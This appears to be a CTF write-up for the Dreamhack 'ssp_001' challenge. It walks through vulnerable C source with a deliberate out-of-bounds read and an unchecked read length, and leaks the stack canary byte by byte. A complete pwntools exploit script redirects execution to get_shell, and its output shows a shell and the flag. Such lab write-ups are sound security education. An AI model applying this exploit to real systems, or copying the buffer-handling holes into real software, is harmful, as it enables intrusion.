### Overview
This is a typical x86 32bits pwnable ctf challenge.
Our goal is override canary value and override return address to get_shell address to get shell and cat flag!

Let's analyze the source code :

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}
void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(30);
}
void get_shell() {
    system("/bin/sh");
}
void print_box(unsigned char *box, int idx) {
    printf("Element of index %d is : %02x\n", idx, box[idx]);
}
void menu() {
    puts("[F]ill the box");
    puts("[P]rint the box");
    puts("[E]xit");
    printf("> ");
}
int main(int argc, char *argv[]) {
    unsigned char box[0x40] = {};
    char name[0x40] = {};
    char select[2] = {};
    int idx = 0, name_len = 0;
    initialize();
    while(1) {
        menu();
        read(0, select, 2);
        switch( select[0] ) {
            case 'F':
                printf("box input : ");
                read(0, box, sizeof(box));
                break;
            case 'P':
                printf("Element index : ");
                scanf("%d", &idx);
                print_box(box, idx);
                break;
            case 'E':
                printf("Name Size : ");
                scanf("%d", &name_len);
                printf("Name : ");
                read(0, name, name_len);
                return 0;
            default:
                break;
        }
    }
}
```
The stack frame of this challenge:
```
 [ebp+4]     : Return address
  [ebp]      : Saved EBP
  [ebp-0x8]   : Canary (4 bytes)
  [ebp-0x48]   : name[0x40] (64 bytes)
  [ebp-0x88]   : box[0x40] (64 bytes)
```

And this challenge canary was found when using `checksec` 
First we should find a way to leak Canary value. After looked at the code, i saw that critical vulnerability named out of bound in print_box() function:

```c
void print_box(unsigned char *box, int idx) {
    printf("Element of index %d is : %02x\n", idx, box[idx]);
}
```
We can leak 2 value a time when call this function, so we will call 4 times to leak 4 bytes canary from this function.

After leak Canary value, we will override it and return address to `get_shell` function from this vulnerability:

```c
case 'E':
    printf("Name Size : ");
    scanf("%d", &name_len);
    printf("Name : ");
    read(0, name, name_len);
    return 0;
```
Combine with these lines from assembly code of main:
```
   0x0804886c <+321>:   mov    edx,DWORD PTR [ebp-0x8]
   0x0804886f <+324>:   xor    edx,DWORD PTR gs:0x14
   0x08048876 <+331>:   je     0x8048884 <main+345>
   0x08048878 <+333>:   jmp    0x804887f <main+340>
   0x0804887a <+335>:   jmp    0x8048790 <main+101>
   0x0804887f <+340>:   call   0x80484e0 <__stack_chk_fail@plt>
   0x08048884 <+345>:   mov    edi,DWORD PTR [ebp-0x4]
   0x08048887 <+348>:   leave
   0x08048888 <+349>:   ret
End of assembler dump.
```
Yeah, we can start override from `name` so the payload is:

`` 64 bytes buf + 4 bytes canary + 4 bytes saved edi + 4 bytes saved ebp + 4 bytes return address``

### Exploitation
```py
from pwn import *
p = remote('host1.dreamhack.games', 14124)
elf = ELF('./ssp_001')
# Convert the canary from string to bytes properly

canary = b''
for i in range(4):
    p.sendline(b'P')
    p.recvuntil(b'Element index : ')
    p.sendline(str(128 + i).encode())
    p.recvuntil(b'Element of index ')
    p.recvuntil(b'is : ')
    value = p.recvline().strip()
    canary += bytes.fromhex(value.decode())
print(canary)
canary = u32(canary)

payload = 64*b'A' + p32(canary)*3  + p32(elf.sym['get_shell'])
p.recvuntil('> ')
p.sendline(b'E\n')
p.sendafter('Name Size : ', b'100\n')
p.sendafter('Name : ', payload)
p.interactive()
```

Result:
```bash
$ python3 exploit.py
[+] Opening connection to host1.dreamhack.games on port 14124: Done
[*] '/home/khanh/Documents/WorkSpaceDreamHack/PWN-dreamhack/ssp_001/ssp_001'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
b'\x00V8\x1b'
/home/khanh/Documents/WorkSpaceDreamHack/PWN-dreamhack/ssp_001/exploit.py:20: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.recvuntil('> ')
/home/khanh/.local/lib/python3.12/site-packages/pwnlib/tubes/tube.py:831: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  res = self.recvuntil(delim, timeout=timeout)
[*] Switching to interactive mode
$ ls
flag
run.sh
ssp_001
$ cat flag
DH{00c609773822372daf2b7ef9adbdb824}$ 
```